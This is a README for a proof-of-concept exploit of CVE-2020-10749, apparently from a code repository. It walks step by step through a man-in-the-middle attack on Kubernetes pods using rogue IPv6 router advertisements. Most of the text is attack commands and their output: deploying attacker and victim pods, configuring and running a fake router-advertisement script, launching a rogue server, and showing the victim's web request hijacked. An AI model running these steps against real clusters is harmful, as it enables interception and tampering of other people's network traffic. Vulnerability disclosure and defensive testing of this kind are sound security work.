# CVE-2020-10749
CVE-2020-10749 PoC (Kubernetes MitM attacks via IPv6 rogue router advertisements)

For educational purposes only

![demo](imgs/CVE-2020-10749.gif)

## Requirements
- Kubernetes cluster with the following kubelet version
  - kubelet v1.18.0-v1.18.3
  - kubelet v1.17.0-v1.17.6
  - kubelet < v1.16.11

## Exploit

### Deploy a victim Pod

```
$ kubectl apply -f victim/victim.yml
$  kubectl ge pods
NAME                       READY   STATUS    RESTARTS   AGE
victim-5484d9f977-pgtnh    1/1     Running   0          10s
$ kubectl exec -it victim-5484d9f977-pgtnh -- sh
/ # apk add curl
/ # ip -6 a show eth0
3: eth0@if25: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 state UP
    inet6 fe80::3c07:afff:feb5:7219/64 scope link
        valid_lft forever preferred_lft forever
/ # ip -6 route
fe80::/64 dev eth0  metric 256
ff00::/8 dev eth0  metric 256
$ curl http://example.com
```

### Deploy an attacker Pod

```
$ kubectl apply -f attacker/attacker.yml
$ kubectl get pods
NAME                       READY   STATUS    RESTARTS   AGE
attacker-8857dd5c9-pnzjw   1/1     Running   0          50s
victim-5484d9f977-pgtnh    1/1     Running   0          10s
```

### Send a rogue router advertisement message

```
$ kubectl exec -it attacker-8857dd5c9-pnzjw -- sh
/ # ip a show eth0 | grep "link/ether" | awk '{print $2}'
aa:ca:d1:91:8f:23
/ # sed -i 's/\[YOUR_MAC_ADDR\]/aa:ca:d1:91:8f:23/g' fake_ra.py
/ # python fake_ra.py
Sending a fake router advertisement message...
.
Sent 1 packets.
```

### Launch a rogue server

```
$ kubectl exec -it attacker-8857dd5c9-pnzjw -- sh
/ # python server.py
Listening...
```

### Acccess to a legitimate web site
Make sure that a new IPv6 address and the default gateway are added.

```
$ kubectl exec -it victim-5484d9f977-pgtnh -- sh
/ # ip -6 a show eth0
3: eth0@if27: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 state UP
    inet6 2001:db8:1:0:1854:9aff:fe75:2368/64 scope global dynamic
           valid_lft forever preferred_lft forever
               inet6 fe80::1854:9aff:fe75:2368/64 scope link
                      valid_lft forever preferred_lft forever
/ # ip -6 route
2001:db8:1::/64 dev eth0  metric 256
fe80::/64 dev eth0  metric 256
default via fe80::42:fcff:dead:beef dev eth0  metric 1024  expires 0sec
ff00::/8 dev eth0  metric 256
/ # curl http://example.com
malicious!!!!!!!
```

## Reference
- https://github.com/kubernetes/kubernetes/issues/91507

## Author
Teppei Fukuda
